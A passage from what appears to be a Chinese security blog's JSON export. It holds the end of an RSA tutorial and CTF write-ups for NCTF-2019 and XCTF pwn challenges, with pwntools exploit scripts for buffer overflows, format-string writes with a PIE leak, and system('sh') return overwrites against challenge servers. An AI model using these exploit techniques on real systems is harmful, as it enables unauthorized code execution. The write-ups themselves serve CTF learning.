φ(n))。只有知道e和φ(n)，才能算出d。而φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。而n=pq。只有将n因数分解，才能算出p和q。综上,如果n可以被因数分解,那么就可以算出d,从而拿到私钥。大数的因数分解是非常困难的。限制人类分解大整数的是计算机的计算能力，相信如果有一天真正的量子计算机问世后，又会引发一轮安全加密竞赛！RSA加解密演示情景导入我们以经典的Alice和Bob的故事来导入情景。Alice在学习了RSA算法以后,制作了公钥和私钥(假定和我们上面制作的公钥私钥一样),Alice将公钥发送给Bob并告诉Bob以后给自己发消息之前先用公钥进行加密，Alice自己保留私钥。加密假设某天Bob要给Alice发送一个字母’A’,Bob需要先将’A’转为ascii码65，所以m = 65。ps: m必须是整数(字符串可以取ascii值或unicode值)，且m必须小于n。那么我们根据下图关系可得到密文c。由于我们的公钥是(n,e) = (3233,17),那么有65^17≡c(mod 3233)(本文中的’^’均表示几次方而不表示异或),这样我们求得c = 2790,那么Bob就可以把c = 2790发送给Alice了。这样即使有第三者截获了密文c,或者截获了公钥和密文c,由于第三者没有私钥,很难将密文c解密到明文m。此时非对称加密的优点便体现出来了。如果看得有点迷,没关系,咱们打个比方。非对称加密就像Alice将一把已经打开的锁发送给了Bob而自己留着开锁钥匙,让Bob每次给自己发送消息的时候都用这把锁将消息锁住,当Alice收到消息后用只有自己才有的钥匙来解锁得到真正的信息。这样就算第三者劫持了密文和锁,因为没有钥匙,也很难很难拿到真正的消息。假设我们用的对称加密,往往会把密钥和密文一同传给接收者,就像把钥匙和密文一起发送出去,这样如果一旦有第三者截获了密文和钥匙,就很容易利用密钥解密得到明文。解密当Alice拿到密文c = 2790,就可以用私钥根据下图关系可得消息m，也就是我们的明文。接收者的私钥(n,d) = (3233,2753)，所以得到2790^2753 ≡ m(mod 3233)。从而可以解得m = 65,转换成字符就是我们的消息’A’。再一例如果我们的明文m不止一个字符,而是一段话(字符串),该如何发送呢？假设Bob要给Alice发送&quot;Hello&quot;,我们需要先str转hex得到0x48656c6c6f,转换为10进制则得到m = 310939249775。 即 str-&gt;hex-&gt;十进制。关于这里的str转hex,提供一个小方法,当然还有更简便的方法比如libnum.s2n: 我们可以遍历字符串中的每个字符,得到每个字符ascii码值的16进制,然后依次拼接,最后在拼接成的字符串前面加上0x,然后16进制转10进制。如果写成代码就是:12345c = 'Hello'res = '0x'for i in c: res += hex(ord(i))[2:]print 'm = ' + str(int(res,16))由于我们前面也谈到了m必须小于n,但是显然我们这个例子里的m=310939249775大于n=3233,我们需要重新生成公钥和私钥。生成过程略,这里直接列出我们的生成结果。p = 999671q = 999727φ(n) = 999396090420n = 999398089817e = 65537d = 529762121873所以公钥为(n,e)=(999398089817,65537),私钥为(n,d)=(999398089817,529762121873)。那么根据m^e ≡ c(mod n)即310939249775^65537 ≡ c(mod 999398089817),我们可以求得c = 274054322757。那么Alice在拿到密文c = 274054322757以后,根据c^d ≡ m(mod n),即274054322757^529762121873 ≡ m (mod n)得到m = 310939249775。那么我们就可以通过m转成我们的明文了。依然是提供几个方法,可能还有更好的方法~print long_to_bytes(m)#需要引入库from Crypto.Util.number import *print hex(m)[2:].replace(‘L’,’’).decode(‘hex’)","categories":[{"name":"密码学","slug":"密码学","permalink":"http://liul14n.top/categories/密码学/"}],"tags":[]},{"title":"NCTF-2019","slug":"NCTF-2019","date":"2019-11-26T10:14:46.000Z","updated":"2019-11-30T15:57:05.714Z","comments":true,"path":"2019/11/26/NCTF-2019/","link":"","permalink":"http://liul14n.top/2019/11/26/NCTF-2019/","excerpt":"","text":"0x00 前言0x01 Re0x001 签到题题目说是考察线性代数,但是可以通过Z3快速求解。Z3脚本如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# -*- coding: UTF-8 -*-import refrom z3 import *solver = Solver()a1 = [Int('a1%d'%i)for i in range(0,49)]solver.add(18564== 34 * a1[3] + 12 * a1[0] + 53 * a1[1] + 6 * a1[2] + 58 * a1[4] + 36 * a1[5] + a1[6])solver.add(37316== 27 * a1[4] + 73 * a1[3] + 12 * a1[2] + 83 * a1[0] + 85 * a1[1] + 96 * a1[5] + 52 * a1[6])solver.add(32053== 24 * a1[2] + 78 * a1[0] + 53 * a1[1] + 36 * a1[3] + 86 * a1[4] + 25 * a1[5] + 46 * a1[6])solver.add(33278== 78 * a1[1] + 39 * a1[0] + 52 * a1[2] + 9 * a1[3] + 62 * a1[4] + 37 * a1[5] + 84 * a1[6])solver.add(23993== 48 * a1[4] + 6 * a1[1] + 23 * a1[0] + 14 * a1[2] + 74 * a1[3] + 12 * a1[5] + 83 * a1[6])solver.add(33151== 15 * a1[5] + 48 * a1[4] + 92 * a1[2] + 85 * a1[1] + 27 * a1[0] + 42 * a1[3] + 72 * a1[6])solver.add(15248== 26 * a1[5] + 67 * a1[3] + 6 * a1[1] + 4 * a1[0] + 3 * a1[2] + 68 * a1[6])solver.add(13719== 34 * a1[10] + 12 * a1[7] + 53 * a1[8] + 6 * a1[9] + 58 * a1[11] + 36 * a1[12] + a1[13])solver.add(34137== 27 * a1[11] + 73 * a1[10] + 12 * a1[9] + 83 * a1[7] + 85 * a1[8] + 96 * a1[12] + 52 * a1[13])solver.add(27391== 24 * a1[9] + 78 * a1[7] + 53 * a1[8] + 36 * a1[10] + 86 * a1[11] + 25 * a1[12] + 46 * a1[13])solver.add(28639== 78 * a1[8] + 39 * a1[7] + 52 * a1[9] + 9 * a1[10] + 62 * a1[11] + 37 * a1[12] + 84 * a1[13])solver.add(18453== 48 * a1[11] + 6 * a1[8] + 23 * a1[7] + 14 * a1[9] + 74 * a1[10] + 12 * a1[12] + 83 * a1[13])solver.add(28465== 15 * a1[12] + 48 * a1[11] + 92 * a1[9] + 85 * a1[8] + 27 * a1[7] + 42 * a1[10] + 72 * a1[13])solver.add(12384== 26 * a1[12] + 67 * a1[10] + 6 * a1[8] + 4 * a1[7] + 3 * a1[9] + 68 * a1[13])solver.add(20780== 34 * a1[17] + 12 * a1[14] + 53 * a1[15] + 6 * a1[16] + 58 * a1[18] + 36 * a1[19] + a1[20])solver.add(45085== 27 * a1[18] + 73 * a1[17] + 12 * a1[16] + 83 * a1[14] + 85 * a1[15] + 96 * a1[19] + 52 * a1[20])solver.add(35827== 24 * a1[16] + 78 * a1[14] + 53 * a1[15] + 36 * a1[17] + 86 * a1[18] + 25 * a1[19] + 46 * a1[20])solver.add(37243== 78 * a1[15] + 39 * a1[14] + 52 * a1[16] + 9 * a1[17] + 62 * a1[18] + 37 * a1[19] + 84 * a1[20])solver.add(26037== 48 * a1[18] + 6 * a1[15] + 23 * a1[14] + 14 * a1[16] + 74 * a1[17] + 12 * a1[19] + 83 * a1[20])solver.add(39409== 15 * a1[19] + 48 * a1[18] + 92 * a1[16] + 85 * a1[15] + 27 * a1[14] + 42 * a1[17] + 72 * a1[20])solver.add(17583== 26 * a1[19] + 67 * a1[17] + 6 * a1[15] + 4 * a1[14] + 3 * a1[16] + 68 * a1[20])solver.add(20825== 34 * a1[24] + 12 * a1[21] + 53 * a1[22] + 6 * a1[23] + 58 * a1[25] + 36 * a1[26] + a1[27])solver.add(44474== 27 * a1[25] + 73 * a1[24] + 12 * a1[23] + 83 * a1[21] + 85 * a1[22] + 96 * a1[26] + 52 * a1[27])solver.add(35138== 24 * a1[23] + 78 * a1[21] + 53 * a1[22] + 36 * a1[24] + 86 * a1[25] + 25 * a1[26] + 46 * a1[27])solver.add(36914== 78 * a1[22] + 39 * a1[21] + 52 * a1[23] + 9 * a1[24] + 62 * a1[25] + 37 * a1[26] + 84 * a1[27])solver.add(25918== 48 * a1[25] + 6 * a1[22] + 23 * a1[21] + 14 * a1[23] + 74 * a1[24] + 12 * a1[26] + 83 * a1[27])solver.add(38915== 15 * a1[26] + 48 * a1[25] + 92 * a1[23] + 85 * a1[22] + 27 * a1[21] + 42 * a1[24] + 72 * a1[27])solver.add(17672== 26 * a1[26] + 67 * a1[24] + 6 * a1[22] + 4 * a1[21] + 3 * a1[23] + 68 * a1[27])solver.add(21219== 34 * a1[31] + 12 * a1[28] + 53 * a1[29] + 6 * a1[30] + 58 * a1[32] + 36 * a1[33] + a1[34])solver.add(43935== 27 * a1[32] + 73 * a1[31] + 12 * a1[30] + 83 * a1[28] + 85 * a1[29] + 96 * a1[33] + 52 * a1[34])solver.add(37072== 24 * a1[30] + 78 * a1[28] + 53 * a1[29] + 36 * a1[31] + 86 * a1[32] + 25 * a1[33] + 46 * a1[34])solver.add(39359== 78 * a1[29] + 39 * a1[28] + 52 * a1[30] + 9 * a1[31] + 62 * a1[32] + 37 * a1[33] + 84 * a1[34])solver.add(27793== 48 * a1[32] + 6 * a1[29] + 23 * a1[28] + 14 * a1[30] + 74 * a1[31] + 12 * a1[33] + 83 * a1[34])solver.add(41447== 15 * a1[33] + 48 * a1[32] + 92 * a1[30] + 85 * a1[29] + 27 * a1[28] + 42 * a1[31] + 72 * a1[34])solver.add(18098== 26 * a1[33] + 67 * a1[31] + 6 * a1[29] + 4 * a1[28] + 3 * a1[30] + 68 * a1[34])solver.add(21335== 34 * a1[38] + 12 * a1[35] + 53 * a1[36] + 6 * a1[37] + 58 * a1[39] + 36 * a1[40] + a1[41])solver.add(46164== 27 * a1[39] + 73 * a1[38] + 12 * a1[37] + 83 * a1[35] + 85 * a1[36] + 96 * a1[40] + 52 * a1[41])solver.add(38698== 24 * a1[37] + 78 * a1[35] + 53 * a1[36] + 36 * a1[38] + 86 * a1[39] + 25 * a1[40] + 46 * a1[41])solver.add(39084== 78 * a1[36] + 39 * a1[35] + 52 * a1[37] + 9 * a1[38] + 62 * a1[39] + 37 * a1[40] + 84 * a1[41])solver.add(29205== 48 * a1[39] + 6 * a1[36] + 23 * a1[35] + 14 * a1[37] + 74 * a1[38] + 12 * a1[40] + 83 * a1[41])solver.add(40913== 15 * a1[40] + 48 * a1[39] + 92 * a1[37] + 85 * a1[36] + 27 * a1[35] + 42 * a1[38] + 72 * a1[41])solver.add(19117== 26 * a1[40] + 67 * a1[38] + 6 * a1[36] + 4 * a1[35] + 3 * a1[37] + 68 * a1[41])solver.add(21786== 34 * a1[45] + 12 * a1[42] + 53 * a1[43] + 6 * a1[44] + 58 * a1[46] + 36 * a1[47] + a1[48])solver.add(46573== 27 * a1[46] + 73 * a1[45] + 12 * a1[44] + 83 * a1[42] + 85 * a1[43] + 96 * a1[47] + 52 * a1[48])solver.add(38322== 24 * a1[44] + 78 * a1[42] + 53 * a1[43] + 36 * a1[45] + 86 * a1[46] + 25 * a1[47] + 46 * a1[48])solver.add(41017== 78 * a1[43] + 39 * a1[42] + 52 * a1[44] + 9 * a1[45] + 62 * a1[46] + 37 * a1[47] + 84 * a1[48])solver.add(29298== 48 * a1[46] + 6 * a1[43] + 23 * a1[42] + 14 * a1[44] + 74 * a1[45] + 12 * a1[47] + 83 * a1[48])solver.add(43409== 15 * a1[47] + 48 * a1[46] + 92 * a1[44] + 85 * a1[43] + 27 * a1[42] + 42 * a1[45] + 72 * a1[48])solver.add(19655== 26 * a1[47] + 67 * a1[45] + 6 * a1[43] + 4 * a1[42] + 3 * a1[44] + 68 * a1[48])if solver.check() == sat: m = solver.model() f = '' for i in range(49): f+=chr(eval(str(solver.model().eval(a1[i])))) print f0x02 DEBUGIDA动态调试即可拿到Flag。0x02 Pwn0x001pwntools直接连接得到flag。0x002 pwn_me_100years(1)1234567891011121314151617from pwn import *#c = process('./pwn_me_1')c = remote('139.129.76.65',50004)#gdb.attach(c,'b * 0x4008D9')payload = 'yes\\00'payload += 'a'*(16-4)payload += p64(0x66666666)c.sendline(payload)c.interactive()0x003 pwn_me_100years(2)12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: PIE enabled考察格式化字符串漏洞以及PIE绕过方式。通过这道题,学到挺多的。对开启PIE保护的程序下断的方法首先是对于开启PIE保护的文件,如果我们要使用gdb调试的话,需要这么下断点:b *$rebase(相对基址偏移),这个相对基址偏移可以在IDA中看到,就是在IDA里面看到的指令地址。但是需要gdb运行程序以后才能下断,gdb里面r了以后程序会直接运行下去,一般来说程序都有提示输入的函数,这时候我们先r然后直接Ctrl + C,然后下断即可。或者通过pie命令可以得到基址。或者通过vmmap或者libs命令得到基址,这俩命令是等价的。然后真实地址 = 基址 + 偏移,通过常规下断方法即可对真实地址下断。PIE绕过通过动态调试,我们可以知道这里的buf与这里的dest是同一块区域。我们可以read读入0x30个字节,但由于strncpy函数会覆盖掉前16个字节,所以我们可以利用后0x30-16个字节。我们通过发送16个填充字符和一个%p(用来泄露地址),得到这个地址，由于开启了PIE保护，所以这个地址每次重新加载程序的时候都会变的。所以我们需要计算出来这个地址跟基址的偏移(偏移保持不变),以不变应万变。我们泄露出来的地址为0x555555756080。由于我们的基址 = 0x555555554000。所以偏移offset = 0x202080。那么每次程序的基址就等于我们每次泄露出来的地址减去偏移offset。格式化字符串漏洞利用剩下的就是格式化字符串漏洞了。我们手动测出来格式化字符串漏洞的offset = 6。下面构造payload,由于目标数值为0x66666666,太大了,我们分批来写。每次写入0x6666即26214,占两个字节。所以我们的payload为:123payload = '%26214c%10$hn%11$hn'#注意 %10$hn%11$hn,原因见下一行。payload = payload.ljust(32,'a')#补齐 让它占32字节,所以offset 需要加32/8 = 4。payload+=p64(target)+p64(target+2)# target+2 因为每次写入的占2字节,需要后移2字节。完整exp如下:1234567891011121314151617181920212223242526272829from pwn import *context.log_level='debug'#p = remote('139.129.76.65',50005)p = process('./pwn_me_2')p.recvuntil('name:\\n')p.sendline('a'*16+'%p.')p.recvuntil('preparing......\\n.')s = p.recvuntil('.',drop=True)base =int(s,16) -(0x555555756080-0x555555554000)log.success('s = ' + s)log.success('base = ' + hex(base))target = base + 0x2020e0log.success('target = ' + hex(target))# offset=6payload = '%26214c%10$hn%11$hn'payload = payload.ljust(32,'a')payload+=p64(target)+p64(target+2)p.recvuntil('want?\\n')gdb.attach(p,'b * ' + hex(base+0xc2c))p.sendline(payload)p.interactive()0x03 Crypto0x001 Keyboard模拟手机九键输入法。ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt eeo对应9,o出现了三次,对应字母y,以此类推…写个解密脚本得到flag。1234567891011# -*- coding: UTF-8 -*-s = 'ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee'L = s.split()list = 'qwertyuio'key = ['','','abc','def','ghi','jkl','mno','pqrs','tuv','wxyz']flag = 'NCTF&#123;'for i in L: n = list.index(i[0]) + 1 length = len(i) flag += key[n][length-1]print flag + '&#125;'0x002 ChildRSA非预期解根据题目,pq应该会比较相近。尝试yafu分解。直接在命令行里面传入n的话,会提示mismatched parens,我们新建一个n.txt,在里面写入n的值,注意最后要加换行!然后用在命令行用命令yafu-x64.exe &quot;factor(@)&quot; -batchfile n.txt。然后几秒钟后就得到了pq的值。那么现在pqnec都知道了,直接求解m即可。123456789101112131415161718import gmpy2p =gmpy2.mpz(178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139)q =gmpy2.mpz(184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867)e =gmpy2.mpz(65537)phi_n= (p - 1) * (q - 1)n=p*qd = gmpy2.invert(e, phi_n)c=gmpy2.mpz(26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108)m=pow(c,d,n)print 'm = ' + str(m)print hex(m)[2:].decode('hex')出题人的意思12345678910111213141516171819from Crypto.Util.number import *​def Pollard_p_1(N): a = 2 while True: f = a # precompute for n in range(1, 80000): f = pow(f, n, N) for n in range(80000, 104729+1): f = pow(f, n, N) if n % 15 == 0: d = GCD(f-1, N) if 1 &lt; d &lt; N: return d print(a) a += 1n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513print( Pollard_p_1(n) )然后就是正常的解密了。0x003 BabyRSA根据代码可以得知p和q是两个相邻的大素数。我们知道了d也知道e。那么根据,可以得到,即,又因为,可得。那么就可以去爆破这个k,从而得到phi (n)。又因为pq是相邻两个大素数,大小差不多,那么,可以通过对phi (n)开根号,在根的附近寻找能够整除phi (n)的数,找到了就是p-1或者q-1,从而获得n,然后获得flag。爆破k的脚本如下:123456789101112131415161718# -*- coding: UTF-8 -*-from Crypto.Util.number import *import gmpy2e = 65537d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804kphi = e*d-1n = 0for k in range(1,e): if kphi % k == 0: phi = kphi/k root = gmpy2.iroot(phi,2)[0] for p in range(root-2000,root+2000): if phi%(p-1) == 0: q = phi/(p-1) + 1 n = p*qprint n注意,求根的时候不能用math.sqrt(),因为我们的数太大了,所以选用gmpy2.iroot来求根。拿到n以后 我们知道了c、d、n,就能得到flag了。1234567891011from Crypto.Util.number import *import gmpy2e = 65537d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804n = 20504410400689593147555423519748552911043953672384279941891248025669880071955689910745346059912207834678616929754630745200468809255570512858402517731386845102068518526083204515529722020838820298462738678975209356676388502939085453171394815425395725474939507125791503971901391160281053434736568444206521730614657374829699726508866785788560535563942763310947712705794037018923200012913764739541376498612705175338275240811678877555686071062194582532893834084310206118431999312683235411343368211050374393142007595048334570583332870345562866644227976136918563977178593767417393759453878935459889615269219607083777401455983m = pow(c, d, n)print(long_to_bytes(m))0x04 Misc0x001 Pip installWin下pip install nctf-2019-installme,会出现一个链接,打开链接下载.gz压缩包,在setup.py里面有flag的base64,解码即可。0x002 a good ideabinwalk拿到to.png和to_do.png。据说用Stegsolve的Image combiner可以拿到二维码。脚本解题,脚本如下:1234567891011121314151617# -*- coding: UTF-8 -*-from PIL import Imageimg1=Image.open(\"C:\\\\Users\\\\LiuLian\\\\Desktop\\\\misc\\\\to.png\")im1=img1.load()img2=Image.open(\"C:\\\\Users\\\\LiuLian\\\\Desktop\\\\misc\\\\to_do.png\")im2=img2.load()width=290height=289image=Image.new('RGB',(width,height))a=0i=0for x in range(img1.size[0]): for y in range(img1.size[1]): if(im1[x,y]!=im2[x,y]): image.putpixel((x,y),(255,255,255))image.show()拿到二维码扫码可得flag。0x003 What’s this从流量包里提取出来What1s7his.txt,base64隐写解码得到flag。0x004 键盘侠解伪加密得到一个图片, binwalk一下拿到好多7z、zip,看了一下zip文件,实际上是个doc文件,拓展名改成doc以后里面内容如下:base85解密得到flag。python3的base64库里面自带b85decode, 但是python2里面没有。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"}],"tags":[]},{"title":"攻防世界-Pwn进阶区(1)","slug":"攻防世界-Pwn进阶区(1)","date":"2019-11-24T08:47:05.000Z","updated":"2019-12-10T12:20:43.309Z","comments":true,"path":"2019/11/24/攻防世界-Pwn进阶区(1)/","link":"","permalink":"http://liul14n.top/2019/11/24/攻防世界-Pwn进阶区(1)/","excerpt":"","text":"0x01 dice_game题目来源:XCTF 4th-QCTF-201812345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled题目逻辑较为简单,题目提供了libc.so.6。所以可以直接覆盖掉seed,然后利用ctypes库模拟生成随机数即可。exp如下:123456789101112131415161718192021222324from pwn import *from ctypes import *#c = process('./dice_game')c = remote('111.198.29.45',58797)libc = cdll.LoadLibrary('libc.so.6')c.recvuntil('name: ')payload = 'a'*0x40payload += p64(1)c.sendline(payload)libc.srand(1)print c.recvline()for i in range(50): c.recvuntil('Give me the point(1~6): ') c.sendline(str(libc.rand()%6+1))c.interactive()0x02 forgot题目来源: backdoorctf-201512345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000)先看一下主函数,注意这一块。v2是个32大小的数组,且用是scanf(&quot;%s&quot;,v2)来进行输入,没有控制输入长度。之后的v3、v4…..v12都为函数指针。这道题就考察通过将目标(get shell)地址覆盖到这几个函数指针中的任意一个来实现调用。题目是一个和检查email格式有关的程序。首先会问你name,这个随便填即可,因为用了fgets且大小合理,不会造成溢出。然后程序会通过sub_80485DD函数欢迎你,告诉你要输入个email。v3到v12都是会puts一段话语,其中v9、v10、v11的内容一样, 因此我们可以选择故意触发v3~v8或者v12其中任意一个函数。(不选v9、v10、v11是因为它们puts的内容一样,不太容易知道到底调用了哪一个,当然也可以选用这些,调试一下也能知道调用的是哪一个。)我们运行一下程序,发现触发了v4所对应的sub_8048618函数。又发现了cat flag函数,地址为0x80486cc。因此覆盖思路为, 先覆盖掉32大小的v2数组,然后用4字节覆盖掉v3指针,然后用目标函数地址覆盖掉v4指针,这样来故意触发cat flag。exp如下:1234567891011from pwn import *c = remote('111.198.29.45',40030)c.sendline('.')payload = '.'*(32+4) + p32(0x80486cc)c.sendline(payload)c.interactive()0x03 warmup攻防世界上面没给题目附件…根据题目来源: csaw-ctf-2016-quals,搜了一下这道题,不难,直接上exp吧:12345678910111213from pwn import *r = remote('192.168.229.128', 10001)r.recvuntil('WOW:')address = r.recvuntil('\\n')[:-1]payload = 'A' * 72 + p64(int(address, 16))r.writeline(payload)r.interactive()0x04 stack2题目来源: XCTF 4th-QCTF-201812345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000)程序是一个简易计算器。漏洞点在3. change number。没有对边界进行检测,可以产生越界操作。首次尝试思路是通过越界操作将ret_addr改成目标(get shell)地址。发现程序存在后面函数hackhere,地址为0x0804859B。首先我们需要知道v13这个数组距离ret_addr的偏移。v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。偏移计算用gdb来调试这个程序,我们将断点下在0x080488EE的位置,即main函数的leave的位置。因为此时栈帧还没还原,这时候我们能读取到ebp(ebp在一个栈帧中是不变的,直到销毁栈帧。所以我们此刻的ebp就是main函数最开始的ebp。),并且再单步几次就能到达retn指令,retn相当于pop eip,此刻栈顶存着的便是ret_addr的位置。运行以后随便个数,然后输入5来执行程序的exit,就可以来到断点位置。这时候看到EBP为0xffffcee8,这个值以及下面会出现的ret_addr的值不同环境可能不一样,但是偏移是一样的。继续单步, 来到ret的位置,我们看到ESP为0xffffcefc,这便是ret_addr的位置。由于v13 = EBP - 0x70,ret_addr - EBP = 0x14,所以偏移offset = ret_addr - v13 = 0x84。编写EXP函数式编程确实挺香,至少对于这次exp里面的write函数是这样,start函数和exit倒无所谓。test.py如下,注意是test,因为这个exp并不正确。1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#c = process('./stack2')c = remote('111.198.29.45',55145)offset = 0x84hackhere_addr = 0x0804859Bdef start(): c.recvuntil('How many numbers you have:\\n') c.sendline('1') c.recvuntil('Give me your numbers\\n') c.sendline('1')def write(addr,value): c.recvuntil('5. exit\\n') c.sendline('3') c.recvuntil('which number to change:\\n') c.sendline(str(addr)) c.recvuntil('new number:\\n') c.sendline(str(value)) def exit(): c.recvuntil('5. exit\\n') c.sendline('5') c.interactive()start()write(offset,0x9B)write(offset+1,0x85)write(offset+2,0x04)write(offset+3,0x08)exit()至于为什么不正确,原因如下。第二次尝试第一种思路由于环境问题未打通, 这次换种思路,直接调用system函数,给它传入参数sh。我们在程序中找到了sh。可以得到sh的地址为0x08048987。exp如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *c = process('./stack2')gdb.attach(c,'b * 0x080488F2')#c = remote('111.198.29.45',55145)offset = 0x84system_addr = 0x08048450def start(): c.recvuntil('How many numbers you have:\\n') c.sendline('1') c.recvuntil('Give me your numbers\\n') c.sendline('1')def write(addr,value): c.recvuntil('5. exit\\n') c.sendline('3') c.recvuntil('which number to change:\\n') c.sendline(str(addr)) c.recvuntil('new number:\\n') c.sendline(str(value)) def exit(): c.recvuntil('5. exit\\n') c.sendline('5') c.interactive()start()write(offset,0x50)write(offset+1,0x84)write(offset+2,0x04)write(offset+3,0x08)offset += 8 #!!!!Look here~ write(offset,0x87)write(offset+1,0x89)write(offset+2,0x04)write(offset+3,0x08)exit()注意offset+8,通过调试也能发现是需要+8,如果不调试而从理论上解释的话,就涉及到参数传递的知识了。这里直接引用某博主的一句解释:调用system后esp指向offset+4的地方，此时esp指向的应该是返回地址，esp+4即offset+8的地方才是system的参数。0x05 pwn100传送门0x06 Mary_Morton题目来源: ASIS-CTF-Finals-201712345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+24h] [rbp-Ch] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); sub_4009FF(); puts(\"Welcome to the battle ! \"); puts(\"[Great Fairy] level pwned \"); puts(\"Select your weapon \"); while ( 1 ) &#123; while ( 1 ) &#123; sub_4009DA(); __isoc99_scanf(\"%d\", &amp;v3); if ( v3 != 2 ) break; fmt(); &#125; if ( v3 == 3 ) &#123; puts(\"Bye \"); exit(0); &#125; if ( v3 == 1 ) stackoverflow(); else puts(\"Wrong!\"); &#125;&#125;unsigned __int64 sub_4008EB()&#123; char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x7FuLL); printf(&amp;buf, &amp;buf); return __readfsqword(0x28u) ^ v2;&#125;unsigned __int64 sub_400960()&#123; char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x100uLL); printf(\"-&gt; %s\\n\", &amp;buf); return __readfsqword(0x28u) ^ v2;&#125;12345678910111213141516.text:00000000004008DA.text:00000000004008DA.text:00000000004008DA ; Attributes: bp-based frame.text:00000000004008DA.text:00000000004008DA 